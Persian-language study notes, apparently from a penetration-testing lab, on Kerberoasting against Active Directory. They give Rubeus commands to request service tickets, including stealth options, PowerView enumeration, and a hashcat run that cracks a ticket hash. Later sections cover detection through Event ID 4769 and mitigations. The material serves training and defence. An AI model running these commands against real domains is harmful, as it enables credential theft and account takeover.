

[[Kerberoasting Overview]]



## 1. مشاهده‌ی محتوای فایل CSV

- فایل CSV خروجی Rubeus شامل SPNهای Kerberoastable است:
    

```
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
```

- نمونه:
    

```
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL",
"adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$..."
```

---

## 2. اجرای Kerberoasting با Rubeus

- **اجرای ساده Kerberoasting**:
    

```
Rubeus.exe kerberoast [/spn:"service/principal"] [/spns:C:\temp\spns.txt] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
```

- **خروجی در فایل**:
    

```
/outfile:hashes.txt
```

- **Kerberoasting با TGT موجود**:
    

```
/ticket:BASE64 | /ticket:FILE.KIRBI
```

- **Kerberoasting با Alternate Credentials**:
    

```
/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD
```

- **Kerberoasting “OpSec”**:
    

```
/rc4opsec
```

- **آمار کاربران Kerberoastable بدون درخواست TGS**:
    

```
/stats
```

- **فیلتر کاربران با AdminCount = 1**:
    

```
/ldapfilter:'admincount=1'
```

- **تعیین محدوده تاریخ تغییر رمز و محدود کردن تعداد تیکت‌ها**:
    

```
/pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5
```

- **تاخیر و jitter بین درخواست‌ها**:
    

```
/delay:5000 /jitter:30
```

- **AES Kerberoasting**:
    

```
/aes
```

---

## 3. مشاهده‌ی آمار با Rubeus

- اجرای دستور `/stats`:
    

```
Rubeus.exe kerberoast /stats
```

- خروجی شامل:
    
    - تعداد کاربران Kerberoastable
        
    - نوع رمزگذاری (RC4/AES)
        
    - سال آخرین تغییر رمز
        

مثال:

|Supported Encryption Type|Count|
|---|---|
|RC4_HMAC_DEFAULT|7|
|AES128/256|2|

|Password Last Set Year|Count|
|---|---|
|2022|9|

- نکته: استفاده از `/nowrap` برای جلوگیری از شکستگی Base64 در خروجی
    

---

## 4. بررسی حساب‌های SPN و نوع رمزگذاری

- با PowerView:
    

```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

- مقدار `msDS-SupportedEncryptionTypes`:
    
    - 0 → RC4_HMAC_MD5 (پیش‌فرض)
        
    - 24 → AES128/AES256 فقط
        

---

## 5. مثال عملی Kerberoasting

1. ایجاد SPN جدید برای تست:
    

```
testspn/kerberoast.inlanefreight.local
```

2. درخواست تیکت با Rubeus:
    

```
Rubeus.exe kerberoast /user:testspn /nowrap
```

3. خروجی RC4 (نوع 23):

![[Pasted image 20250923060907.png]]



    

```
$krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local*...
```

---

## 6. کرک کردن تیکت با Hashcat

- مثال اجرای Hashcat برای RC4:
    

```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

- نکات:
    
    - با CPU → چند ثانیه
        
    - با GPU → تقریباً آنی
        
    - AES 128/256 زمان بیشتری نیاز دارد ولی امکان‌پذیر است
        
- نمونه خروجی:
    

```
Status: Cracked
Hash.Target: $krb5tgs$23$*testspn$...
Recovered: welcome1$
```

---

## 7. نکات مهم Kerberoasting

1. RC4 ساده‌تر و سریع‌تر برای کرک است.
    
2. AES-128 و AES-256 امن‌تر هستند و زمان کرک بیشتری می‌طلبند.
    
3. بررسی SPNهای قدیمی و رمزهای چندساله → ممکن است هدف‌های مناسبی باشند.
    
4. برای کرک بهتر، از `/nowrap` استفاده کنید تا Base64 در خروجی خراب نشود.
    

---


## نکته : امکان تغییر نوع‌های رمزگذاری در Kerberos وجود دارد. این کار از طریق **Group Policy** انجام می‌شود:


- مسیر:
- `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`
    
- گزینه: 
- `Network security: Configure encryption types allowed for Kerberos`

- نوع رمزگذاری دلخواه را انتخاب کنید.
    

اگر همه‌ی نوع‌های رمزگذاری به جز RC4_HMAC_MD5 حذف شوند، مثال تنزل ذکر شده در سال ۲۰۱۹ نیز ممکن خواهد بود.  
حذف پشتیبانی از AES می‌تواند یک **نقص امنیتی جدی** در Active Directory ایجاد کند و به هیچ وجه توصیه نمی‌شود. همچنین حذف پشتیبانی از RC4، بدون توجه به نسخه‌ی Windows Server یا سطح عملکرد دامنه، ممکن است **تأثیرات عملیاتی جدی** داشته باشد و پیش از اعمال، باید به‌طور کامل تست شود.

![[Pasted image 20250923061128.png]]



### شناسایی Kerberoasting از طریق Event ID

- هنگام ثبت درخواست‌های Kerberos TGS، دو **Event ID** اصلی تولید می‌شود:
    
    - **4769:** یک تیکت سرویس Kerberos درخواست شد.
        
    - **4770:** یک تیکت سرویس Kerberos تمدید شد.
        
- تعداد **10-20 درخواست TGS برای یک حساب** در بازه زمانی مشخص، معمولاً طبیعی است.
    
- **تعداد زیاد Event ID 4769** از یک حساب در مدت کوتاه می‌تواند نشان‌دهنده **حمله Kerberoasting** باشد.
    

**مثال:**

- مشاهده چندین Event ID 4769 پشت سر هم، رفتار غیرعادی محسوب می‌شود.
    
- بررسی یک Event نشان می‌دهد کاربر **htb-student (حمله‌کننده)** برای حساب **sqldev (هدف)** درخواست تیکت سرویس داده است.
    
- نوع رمزگذاری تیکت **0x17** (معادل 23، شامل DES، RC4، AES 256) بوده است.
    
- این یعنی تیکت درخواست شده با **RC4** رمزگذاری شده و اگر رمز حساب ضعیف باشد، احتمال کرک شدن و کنترل حساب هدف وجود دارد.

### اقدامات اصلاحی دیگر برای کاهش ریسک Kerberoasting

- **محدود کردن استفاده از الگوریتم RC4**، به ویژه برای درخواست‌های Kerberos توسط حساب‌های سرویس، یکی از اقدامات مهم است. این تغییر باید پیش از اعمال در محیط، **آزمایش شود تا مشکلی ایجاد نکند**.
    
- **حساب‌های Domain Admin و سایر حساب‌های با دسترسی بالا** نباید به عنوان SPN استفاده شوند (در صورتی که وجود حساب SPN در محیط ضروری است).
    
- این مطلب توسط **Sean Metcalf** نکات مفیدی درباره **روش‌های شناسایی و کاهش ریسک Kerberoasting** ارائه کرده است.